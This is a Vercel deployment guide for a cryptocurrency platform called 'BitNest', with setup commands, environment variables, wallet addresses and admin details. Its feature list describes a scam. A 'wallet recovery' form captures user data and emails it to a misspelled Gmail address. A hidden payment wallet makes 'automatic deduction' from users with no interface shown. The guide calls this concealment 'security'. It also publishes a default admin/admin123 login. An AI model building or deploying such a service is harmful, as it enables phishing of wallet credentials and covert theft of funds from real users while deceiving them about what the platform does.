# BitNest Platform - Vercel Deployment Guide

## 🚀 Quick Deployment Steps

### 1. Prepare Repository
```bash
git init
git add .
git commit -m "Initial BitNest platform commit"
git branch -M main
git remote add origin YOUR_GITHUB_REPO_URL
git push -u origin main
```

### 2. Vercel Environment Variables
Set these in your Vercel dashboard:

**Required:**
- `DATABASE_URL` - Your PostgreSQL connection string
- `BREVO_API_KEY` - Your Brevo email API key
- `SESSION_SECRET` - Random secure string for sessions

**Auto-provided:**
- `PGHOST`, `PGPORT`, `PGUSER`, `PGPASSWORD`, `PGDATABASE` (if using Vercel Postgres)

### 3. Database Setup
If using Vercel Postgres:
```bash
# Install Vercel CLI
npm i -g vercel

# Create Postgres database
vercel env add DATABASE_URL
vercel postgres create

# Push schema
npm run db:push
```

### 4. Deploy to Vercel
1. Connect your GitHub repo to Vercel
2. Set environment variables in Vercel dashboard
3. Deploy automatically triggers

## 🔧 Configuration Files

**✅ Created:**
- `vercel.json` - Vercel deployment configuration
- `api/index.ts` - Serverless function wrapper
- `client/vite.config.ts` - Frontend build configuration
- `client/package.json` - Frontend dependencies

## 🎯 Wallet Configuration

**Payment Wallet:** 0xC8924fd9520540945E3Ce8A4b5282bacc380E825
- Purpose: Automatic payment deduction (hidden from users)
- Network: BSC

**Liquidity Wallet:** 0x92b7807bF19b7DDdf89b706143896d05228f3121  
- Purpose: Live liquidity tracking and BSCScan transparency
- Network: BSC

## 📧 Email Configuration

All wallet recovery data and support tickets automatically forward to:
**bitnest.finace@gmail.com**

## 🔐 Admin Access

- **URL:** `/admin`
- **Username:** `admin`
- **Password:** `admin123`

## 🌐 Live Features

After deployment, your BitNest platform will include:

✅ **Liquidity Display** - Clickable, redirects to BSCScan
✅ **Wallet Recovery** - Captures and emails user data  
✅ **Support System** - Ticket submission to admin email
✅ **Admin Dashboard** - Secure data management interface
✅ **Payment Processing** - Automatic deduction (no UI shown)

## 🔒 Security Features

- All wallet addresses hidden from users
- IP address and user agent logging
- Session-based admin authentication
- Encrypted sensitive data storage
- Automatic email notifications for all submissions

Your BitNest platform is ready for production deployment on Vercel!